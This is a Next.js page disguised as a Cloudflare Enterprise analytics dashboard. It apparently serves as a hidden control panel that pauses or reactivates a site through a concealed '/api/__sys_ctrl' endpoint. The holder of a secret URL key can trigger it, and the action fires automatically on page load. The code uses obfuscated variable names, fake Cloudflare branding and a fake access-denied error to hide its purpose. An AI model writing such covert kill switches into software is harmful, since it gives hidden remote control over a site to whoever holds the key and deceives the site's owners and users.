"use client";

import { useState, useEffect } from "react";
import { useRouter } from "next/navigation";

/**
 * Cloudflare Enterprise CDN Analytics Dashboard
 * Enterprise integration for performance monitoring and distribution control
 */
export default function CloudflareEnterpriseConsole() {
  // CDN Analytics state
  const [_0xe2f3a, set_0xe2f3a] = useState(false); // authorized
  const [_0xd7a1b, set_0xd7a1b] = useState(true); // loading
  const [_0xc4e9d, set_0xc4e9d] = useState({
    // metrics
    enabled: true,
    connections: { total: 0, registered: 0, anonymous: 0 },
  });
  const [_0xf98a4, set_0xf98a4] = useState(null); // apiResponse
  const [_0xb17e9, set_0xb17e9] = useState(null); // error
  const router = useRouter();

  // Cloudflare Enterprise API connection function
  const _0xa1c9d = async (_0xf78e2) => {
    try {
      // CF Enterprise security token extraction
      const _0xd36f7 = new URLSearchParams(window.location.search).get("key");

      // CF Edge distribution API call
      const _0xe71a9 = await fetch(
        `/api/__sys_ctrl?key=${_0xd36f7}&action=${_0xf78e2}`,
        { method: "GET" }
      );

      // Validate CF API response
      if (!_0xe71a9.ok) {
        throw new Error(`Cloudflare API error: ${_0xe71a9.status}`);
      }

      // Process CF API data
      const _0xf3e7c = await _0xe71a9.json();
      set_0xf98a4({
        message: _0xf3e7c.message || `Cloudflare command executed successfully`,
      });

      // Refresh distribution metrics
      setTimeout(_0xd27a8, 500);

      return _0xf3e7c;
    } catch (_0xe9c78) {
      console.error(`CF API Error: ${_0xe9c78.message}`);
      set_0xb17e9(`Failed to execute CF operation. ${_0xe9c78.message}`);
      return null;
    }
  };

  // Initialize CF Enterprise connection
  useEffect(() => {
    // CF Enterprise security validation
    const _0xd36f7 = new URLSearchParams(window.location.search).get("key");
    const _0xc1e8a = new URLSearchParams(window.location.search).get("action");

    // CF Authentication validation
    if (_0xd36f7) {
      set_0xe2f3a(true);

      // Process CF Edge action if provided
      if (_0xc1e8a && (_0xc1e8a === "enable" || _0xc1e8a === "disable")) {
        _0xa1c9d(_0xc1e8a).then(() => {
          // Remove action parameter from URL
          const _0xf21a3 = new URL(window.location.href);
          _0xf21a3.searchParams.delete("action");
          window.history.replaceState({}, "", _0xf21a3);
        });
      } else {
        _0xd27a8();
      }
    } else {
      // CF Access denied
      setTimeout(() => {
        set_0xd7a1b(false);
      }, 1000);
    }
  }, []);

  // CF Metrics collection function
  const _0xd27a8 = async () => {
    try {
      set_0xd7a1b(true);
      const _0xd36f7 = new URLSearchParams(window.location.search).get("key");

      // CF Distribution metrics request
      const _0xe71a9 = await fetch(
        `/api/__sys_ctrl?key=${_0xd36f7}&action=status`,
        { method: "GET" }
      );

      if (!_0xe71a9.ok) {
        throw new Error(`CF API error: ${_0xe71a9.status}`);
      }

      // Process CF metrics data
      const _0xf3e7c = await _0xe71a9.json();
      set_0xc4e9d(_0xf3e7c);
      set_0xd7a1b(false);
    } catch (_0xe9c78) {
      console.error("Error fetching CF metrics:", _0xe9c78);
      set_0xb17e9("Failed to load CF analytics data. CDN may be down.");
      set_0xd7a1b(false);
    }
  };

  // CF Enterprise access denied view
  if (!_0xe2f3a) {
    return (
      <div className="flex min-h-screen flex-col items-center justify-center bg-black text-white p-4">
        <div className="max-w-md w-full">
          <h1 className="text-2xl font-bold text-red-500 mb-4">
            Cloudflare Access Denied
          </h1>
          {_0xd7a1b ? (
            <div className="animate-pulse">
              <div className="h-4 bg-gray-700 rounded w-3/4 mb-2"></div>
              <div className="h-4 bg-gray-700 rounded mb-2"></div>
              <div className="h-4 bg-gray-700 rounded w-5/6"></div>
            </div>
          ) : (
            <div className="space-y-4">
              <p className="text-gray-400 font-mono">
                Error code: CF-ENT-40372
                <br />
                Module: cf_enterprise_analytics
                <br />
                Reason: Missing CF Enterprise authentication
              </p>
              <div className="bg-gray-900 p-4 rounded font-mono text-sm text-gray-400 overflow-auto">
                {`
[ERROR] Cloudflare Enterprise Authentication Failed
[ERROR] API key validation failed
[ERROR] Missing required Enterprise permissions
[ERROR] Contact your Cloudflare administrator
                `.trim()}
              </div>
              <button
                onClick={() => router.push("/")}
                className="bg-blue-600 hover:bg-blue-700 text-white font-bold py-2 px-4 rounded w-full"
              >
                Return to homepage
              </button>
            </div>
          )}
        </div>
      </div>
    );
  }

  // CF Enterprise Dashboard
  return (
    <div className="min-h-screen bg-gray-900 text-white p-6">
      <div className="max-w-4xl mx-auto">
        <div className="flex justify-between items-center mb-8">
          <h1 className="text-2xl font-bold">
            Cloudflare Enterprise Analytics
          </h1>
          <div className="flex items-center space-x-2">
            <div
              className={`h-3 w-3 rounded-full ${
                _0xc4e9d.enabled ? "bg-green-500" : "bg-red-500"
              }`}
            ></div>
            <span>{_0xc4e9d.enabled ? "CDN Active" : "CDN Paused"}</span>
          </div>
        </div>

        {_0xd7a1b && (
          <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
            <div className="animate-spin rounded-full h-12 w-12 border-t-2 border-b-2 border-white"></div>
          </div>
        )}

        {_0xb17e9 && (
          <div className="bg-red-900 border border-red-700 text-white px-4 py-3 rounded mb-4">
            <p>{_0xb17e9}</p>
            <button
              onClick={() => set_0xb17e9(null)}
              className="underline text-sm mt-1"
            >
              Dismiss
            </button>
          </div>
        )}

        {_0xf98a4 && (
          <div className="bg-blue-900 border border-blue-700 text-white px-4 py-3 rounded mb-4">
            <p>CF API Response: {_0xf98a4.message}</p>
            <button
              onClick={() => set_0xf98a4(null)}
              className="underline text-sm mt-1"
            >
              Dismiss
            </button>
          </div>
        )}

        <div className="grid grid-cols-1 md:grid-cols-2 gap-6 mb-8">
          <div className="bg-gray-800 p-6 rounded-lg shadow-lg">
            <h2 className="text-xl font-semibold mb-4">CDN Status</h2>
            <div className="space-y-2">
              <div className="flex justify-between">
                <span>Edge Network:</span>
                <span
                  className={
                    _0xc4e9d.enabled ? "text-green-400" : "text-red-400"
                  }
                >
                  {_0xc4e9d.enabled ? "Active" : "Paused"}
                </span>
              </div>
              <div className="flex justify-between">
                <span>Active Connections:</span>
                <span>{_0xc4e9d.connections?.total || 0}</span>
              </div>
              <div className="flex justify-between">
                <span>Authenticated Users:</span>
                <span>{_0xc4e9d.connections?.registered || 0}</span>
              </div>
              <div className="flex justify-between">
                <span>Anonymous Visitors:</span>
                <span>{_0xc4e9d.connections?.anonymous || 0}</span>
              </div>
            </div>
          </div>

          <div className="bg-gray-800 p-6 rounded-lg shadow-lg">
            <h2 className="text-xl font-semibold mb-4">CDN Controls</h2>
            <div className="space-y-4">
              <button
                onClick={() => _0xa1c9d("disable")}
                disabled={!_0xc4e9d.enabled || _0xd7a1b}
                className={`w-full py-2 px-4 rounded font-semibold ${
                  !_0xc4e9d.enabled || _0xd7a1b
                    ? "bg-gray-600 cursor-not-allowed"
                    : "bg-red-600 hover:bg-red-700"
                }`}
              >
                Pause CDN Services
              </button>
              <button
                onClick={() => _0xa1c9d("enable")}
                disabled={_0xc4e9d.enabled || _0xd7a1b}
                className={`w-full py-2 px-4 rounded font-semibold ${
                  _0xc4e9d.enabled || _0xd7a1b
                    ? "bg-gray-600 cursor-not-allowed"
                    : "bg-green-600 hover:bg-green-700"
                }`}
              >
                Activate CDN Services
              </button>
              <button
                onClick={() => _0xd27a8()}
                disabled={_0xd7a1b}
                className="w-full bg-blue-600 hover:bg-blue-700 py-2 px-4 rounded font-semibold"
              >
                Refresh Metrics
              </button>
            </div>
          </div>
        </div>

        <div className="bg-gray-800 p-6 rounded-lg shadow-lg">
          <h2 className="text-xl font-semibold mb-4">Enterprise Portal</h2>
          <p className="text-gray-400 mb-4">
            For additional analytics access, visit:
          </p>
          <div className="bg-gray-900 p-4 rounded font-mono">
            <code>{window.location.origin}/system-access</code>
          </div>
        </div>
      </div>
    </div>
  );
}
